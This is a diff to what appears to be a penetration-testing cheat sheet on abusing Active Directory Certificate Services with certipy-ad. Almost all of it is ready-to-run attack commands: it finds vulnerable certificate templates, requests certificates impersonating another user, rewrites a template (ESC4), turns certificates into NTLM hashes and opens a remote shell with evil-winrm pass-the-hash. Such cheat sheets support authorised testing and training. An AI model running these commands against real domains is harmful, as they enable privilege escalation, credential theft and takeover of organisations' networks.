@@ -20,6 +20,11 @@ certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vuln
 certipy-ad find -u '<USER>' -hashes '<HASH>' -target <TARGET> -text -stdout -vulnerable
 ```
 
+```console
+# Kerberos
+certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP>
+```
+
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
@@ -200,12 +205,12 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 
 ```console
 # Password
-certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
+certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
 ```
 
 ```console
 # NTLM
-certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
+certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
 ```
 
 ```console {class="sample-code"}
@@ -227,24 +232,29 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 ```console
 # Password
-certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
+certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
+```
+
+```console
+# NTLM
+certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
 ```
 
 ```console
 # Kerberos
-certipy-ad req -u '<USER>' -p '<PASSWORD>' -k -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
+certipy-ad req -u '<USER>' -p '<PASSWORD>' -k -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
 ```
 
 #### 3. Get NTLM Hash
 
 ```console
-sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
+sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx <TARGET_USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
 ```
 
 #### 4. Remote
 
 ```console
-evil-winrm -i <TARGET> -u administrator -H <HASH>
+evil-winrm -i <TARGET> -u <TARGET_USER> -H <HASH>
 ```
 
 {{< /tabcontent >}}
@@ -352,6 +362,11 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 #### 1. Update Template
 
 ```console
+# Password
+certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -write-default-configuration -no-save
+```
+
+```console
 # NTLM
 certipy-ad template -u '<USER>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>' -write-default-configuration -no-save
 ```
@@ -382,6 +397,11 @@ Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (
 ```
 
 #### 2. Request a Cert Based on the ESC4 Template
+
+```console
+# Password
+certipy-ad req -username '<USER>' -p '<PASSWORD>' -template '<TEMPLATE>' -target <TARGET> -ca <CA> -upn administrator@<DOMAIN>
+```
 
 ```console
 # NTLM
